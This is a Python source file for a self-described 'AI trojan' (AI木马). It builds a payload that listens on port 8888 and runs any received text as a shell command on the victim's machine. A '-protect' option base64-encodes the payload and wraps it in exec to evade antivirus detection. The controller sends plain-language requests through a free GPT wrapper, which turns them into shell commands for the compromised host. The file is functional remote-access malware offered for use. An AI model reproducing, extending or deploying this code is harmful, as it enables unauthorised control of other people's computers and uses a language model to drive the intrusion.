import freeGPT
import asyncio
import threading
import socket
import sys
import base64
import os

payload='''import socket
import threading
import subprocess

def execute_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.returncode, result.stdout, result.stderr
    except Exception as e:
        return -1, '', str(e)
local_ip = 'payload_ip'
local_port = 8888
server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((local_ip, local_port))
client_sockets = []
lock = threading.Lock()
def receive_message(sock):
    data = sock.recv(1024).decode()
    return data
def send_message(sock, message):
    sock.send(message.encode())
def handle_client(sock):
    while True:
        try:
            received_message = receive_message(sock)
            if not received_message or received_message == 'exit':
                break
            command = received_message
            returncode, stdout, stderr = execute_shell_command(command)
            if returncode == 0:
               result = "执行成功:\\n"+stdout
            else:
              result = "失败"+stderr
            with lock:
                for client_sock in client_sockets:
                    send_message(client_sock,result)
        except:
            break
    sock.close()
    with lock:
        client_sockets.remove(sock)

def controlled_send_message(message):
    with lock:
        for client_sock in client_sockets:
            send_message(client_sock, message)
server_sock.listen(5)
while True:
    client_sock, addr = server_sock.accept()
    with lock:
        client_sockets.append(client_sock)
    client_thread = threading.Thread(target=handle_client, args=(client_sock,))
    client_thread.start()
'''

def get_local_ipv4():
    try:
        # 创建一个UDP套接字
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # 连接到公共的DNS服务器（例如Google的DNS服务器）
        sock.connect(("8.8.8.8", 80))
        # 获取本地套接字的IP地址和端口
        local_ip = sock.getsockname()[0]
        return local_ip
    except Exception as e:
        return str(e)

# 获取本机内网的IPv4地址
local_ipv4 = get_local_ipv4()

if len(sys.argv)>1 and sys.argv[1]!="--help" and sys.argv[1]!="-create" and sys.argv[1]!="-ip":
     sys.exit(0)

localhost_ip = "127.0.0.1"

if len(sys.argv)>2 and sys.argv[1]=="-ip":
    localhost_ip = sys.argv[2]
    print("当前启动ip: "+ localhost_ip)

if len(sys.argv)>1:
    if sys.argv[1]=="--help":
     print("AI木马1.0.0 ( https://github.com/Alanblxc )")
     print(" 生成木马: ")
     print("  -create 生成木马")
     print("  -create -protect 免杀木马")
     print("  -create ip 自定义Ip地址")
     print("  -create -protec ip 免杀木马 自定义Ip地址")
     print(" 启动参数: ")
     print("  -ip ip 自定义ip开启监听")
     sys.exit(0)

if len(sys.argv)>2:
     if sys.argv[1]=="-create" and sys.argv[2]!="-protect":
        with open('payload.py', 'w') as file:
         file.write(payload.replace("payload_ip",sys.argv[2]))
        sys.exit(0)


# 获取命令行参数
if len(sys.argv)>1:
    if len(sys.argv)>2 and sys.argv[2]=="-protect":
         if len(sys.argv)>3:
             payload = payload.replace("payload_ip",sys.argv[3])
         else:
             payload = payload.replace("payload_ip",local_ipv4)
         payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
         with open('payload.py', 'w') as file:
          file.write(f"p='''{payload}'''\nimport base64\nexec(base64.b64decode(p).decode('utf-8'))")
         sys.exit(0)


if len(sys.argv)==2 and sys.argv[1]=="-create":
    with open('payload.py', 'w') as file:
     file.write(payload.replace("payload_ip",local_ipv4))
    sys.exit(0)



# 设置服务器的IP地址和端口
server_ip = localhost_ip
server_port = 8888

# 创建TCP套接字并连接到服务器
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server_ip, server_port))

def send_message(sock, message):
    sock.send(message.encode())

def control_send_message(message):
    send_message(sock, message)

def receive_message(sock):
    data = sock.recv(1024).decode()
    return data

def handle_server_response():
    while True:
        try:
            # 接收服务器发送的消息
            received_message = receive_message(sock)
            
            # 打印收到的消息
            print(received_message)
        except:
            break

# 创建线程处理服务器响应
response_thread = threading.Thread(target=handle_server_response)
response_thread.start()

async def main():
    print("连接成功，请输入指令:")
    while True:
        shell = input("")
        if shell == 'exit':
            os._exit(0)
        prompt = shell+"，你只需要回答相应的shell指令，不要附加其他内容，如果我说的是ls，你就回复ls"
        resp = await getattr(freeGPT, "gpt3").Completion.create(prompt)
        # print(f"{resp}\n发送中.....")
        control_send_message(resp)
        # print(f"发送成功")

        

asyncio.run(main())


# 关闭套接字
sock.close()


